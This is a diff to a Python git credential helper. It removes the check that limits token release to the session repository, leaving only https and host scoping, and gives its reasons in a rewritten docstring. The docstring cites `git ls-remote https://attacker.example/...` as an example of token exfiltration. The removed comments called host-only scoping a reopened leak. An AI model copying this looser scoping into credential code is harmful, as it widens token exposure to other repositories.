@@ -117,43 +117,18 @@ def _credentials_from_env() -> dict[str, object] | None:
     }
 
 
-def _normalize_repo_path(path: str) -> str:
-    """Normalize a git credential `path=` value to ``owner/repo`` form.
-
-    Handles normal git remotes (with or without ``.git``) and Git LFS
-    credential requests ending in ``.git/info/lfs``.
-    """
-    normalized = path.strip().strip("/").lower()
-    if normalized.endswith(".git/info/lfs"):
-        normalized = normalized[: -len(".git/info/lfs")]
-    if normalized.endswith(".git"):
-        normalized = normalized[: -len(".git")]
-    return normalized
-
-
-def _expected_repo_path() -> str | None:
-    """Return the session repo as ``owner/repo``, or None if not configured."""
-    owner = os.environ.get("REPO_OWNER", "").strip().lower()
-    name = os.environ.get("REPO_NAME", "").strip().lower()
-    if not owner or not name:
-        return None
-    return f"{owner}/{name}"
-
-
 def _is_authorized_request(input_lines: dict[str, str]) -> tuple[bool, str]:
     """Decide whether to serve credentials for this credential request.
 
     The system-wide helper would otherwise hand the SCM token to any host
     git resolves — a malicious submodule URL or `git ls-remote
-    https://attacker.example/...` could exfiltrate the installation token.
-    We scope on three axes:
+    https://attacker.example/...` could exfiltrate the installation token. We
+    scope by protocol and host. We deliberately do not scope to the session repo:
+    the existing system uses installation-wide credentials, and setup/start hooks
+    may clone sibling private repositories that the installation can access.
 
     * protocol must be ``https`` (never hand a token to a plaintext remote);
-    * host must equal the configured ``VCS_HOST``;
-    * path must be the session repo. We set ``credential.useHttpPath=true``
-      wherever the helper is installed, so git always passes a path; a
-      missing path means a misconfigured image and we fail closed rather
-      than degrade to host-only scoping (which would re-open the leak).
+    * host must equal the configured ``VCS_HOST``.
 
     Returns ``(authorized, reason)`` so the caller can log the rejection.
     """
@@ -167,19 +142,6 @@ def _is_authorized_request(input_lines: dict[str, str]) -> tuple[bool, str]:
     expected_host = os.environ.get("VCS_HOST", "github.com").strip().lower()
     if requested_host != expected_host:
         return False, f"host={requested_host!r} (expected {expected_host!r})"
-
-    # Path is mandatory: we configure credential.useHttpPath=true wherever the
-    # helper is installed, so git always passes it. A missing path means a
-    # misconfigured image — fail closed rather than fall back to host-only
-    # scoping, which would re-open the same-host leak.
-    requested_path = input_lines.get("path", "").strip()
-    if not requested_path:
-        return False, "no path provided (credential.useHttpPath unset?)"
-    expected_path = _expected_repo_path()
-    if expected_path is None:
-        return False, "REPO_OWNER/REPO_NAME not configured"
-    if _normalize_repo_path(requested_path) != expected_path:
-        return False, f"path={requested_path!r} (expected {expected_path!r})"
 
     return True, ""
 
@@ -342,10 +304,10 @@ def main(argv: list[str] | None = None) -> int:
 
     input_lines = _read_protocol_input(sys.stdin)
 
-    # Scope the request to the session repo over https on the configured
-    # host. git treats an empty response as "I have nothing", so returning
-    # 0 with no output lets it fall through to any other helper or fail the
-    # auth cleanly — without us ever emitting the token to the wrong place.
+    # Scope the request to https on the configured host. git treats an empty
+    # response as "I have nothing", so returning 0 with no output lets it fall
+    # through to any other helper or fail the auth cleanly — without us ever
+    # emitting the token to the wrong host.
     authorized, reason = _is_authorized_request(input_lines)
     if not authorized:
         _log(f"refusing to serve credentials: {reason}")
